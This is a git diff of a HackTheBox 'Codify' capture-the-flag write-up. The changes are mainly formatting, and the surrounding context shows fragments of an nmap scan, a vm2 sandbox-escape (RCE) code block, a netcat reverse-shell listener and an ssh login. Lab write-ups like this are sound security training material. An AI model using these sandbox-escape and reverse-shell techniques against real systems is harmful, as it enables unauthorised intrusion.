@@ -1,5 +1,11 @@
-# HackTheBox Codify Writeup
+---
+description: HackTheBox Codify Writeup (Easy)
+---
+
+# Codify Writeup
+
 ## Nmap
+
 ```bash
 Nmap scan report for 10.10.11.239
 Host is up, received user-set (0.015s latency).
@@ -25,6 +31,7 @@ PORT      STATE    SERVICE   REASON         VERSION
 ```
 
 ### VM2 RCE
+
 ```bash
 const { VM } = require("vm2");
 const vm = new VM();
@@ -48,7 +55,9 @@ const code = `
 
 console.log(vm.run(code));
 ```
+
 ### Reverse Shell
+
 ```
 rlwrap nc -lnvp 1234    
 listening on [any] 1234 ...
@@ -92,6 +101,7 @@ Tom HanksNeed networking modulesI think it would be better if you can implement 
 ```
 
 ## User Flag
+
 ```bash
 ssh joshua@10.10.11.239
 
